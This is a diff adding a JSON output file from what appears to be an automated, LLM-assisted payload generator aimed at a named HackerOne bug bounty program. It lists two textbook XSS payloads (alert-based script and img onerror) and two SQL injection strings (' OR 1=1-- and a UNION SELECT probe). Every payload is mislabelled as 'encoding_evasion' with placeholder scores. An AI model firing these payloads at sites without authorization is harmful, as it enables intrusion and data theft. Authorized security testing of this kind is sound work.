@@ -1,0 +1,89 @@
+{
+  "target_profile": {
+    "url": "https://hackerone.com/kolesagroup",
+    "technology_stack": [
+      "Web Application"
+    ],
+    "industry_sector": "Technology"
+  },
+  "generation_parameters": {
+    "creativity_level": 0.8,
+    "count_per_type": 2,
+    "vulnerability_types": [
+      "xss",
+      "sqli"
+    ]
+  },
+  "payloads_by_category": {
+    "xss": {
+      "payloads": [
+        {
+          "payload_content": "<script>alert('Advanced XSS')</script>",
+          "technique": "encoding_evasion",
+          "creativity_score": 3.0,
+          "bypass_mechanisms": [
+            "basic"
+          ],
+          "explanation": "Fallback payload when LLM unavailable",
+          "evasion_methods": [],
+          "detection_difficulty": 3.0,
+          "business_impact": "Variable",
+          "confidence_score": 0.5
+        },
+        {
+          "payload_content": "<img src=x onerror=alert(document.domain)>",
+          "technique": "encoding_evasion",
+          "creativity_score": 3.0,
+          "bypass_mechanisms": [
+            "basic"
+          ],
+          "explanation": "Fallback payload when LLM unavailable",
+          "evasion_methods": [],
+          "detection_difficulty": 3.0,
+          "business_impact": "Variable",
+          "confidence_score": 0.5
+        }
+      ],
+      "count": 2,
+      "average_creativity": 3.0
+    },
+    "sqli": {
+      "payloads": [
+        {
+          "payload_content": "' OR 1=1--",
+          "technique": "encoding_evasion",
+          "creativity_score": 3.0,
+          "bypass_mechanisms": [
+            "basic"
+          ],
+          "explanation": "Fallback payload when LLM unavailable",
+          "evasion_methods": [],
+          "detection_difficulty": 3.0,
+          "business_impact": "Variable",
+          "confidence_score": 0.5
+        },
+        {
+          "payload_content": "' UNION SELECT 1,2,3--",
+          "technique": "encoding_evasion",
+          "creativity_score": 3.0,
+          "bypass_mechanisms": [
+            "basic"
+          ],
+          "explanation": "Fallback payload when LLM unavailable",
+          "evasion_methods": [],
+          "detection_difficulty": 3.0,
+          "business_impact": "Variable",
+          "confidence_score": 0.5
+        }
+      ],
+      "count": 2,
+      "average_creativity": 3.0
+    }
+  },
+  "generation_metadata": {
+    "generated_at": "2025-07-23T08:31:33.798694",
+    "total_payloads": 4,
+    "generation_cost": 0.0,
+    "session_id": 125550296498736
+  }
+}
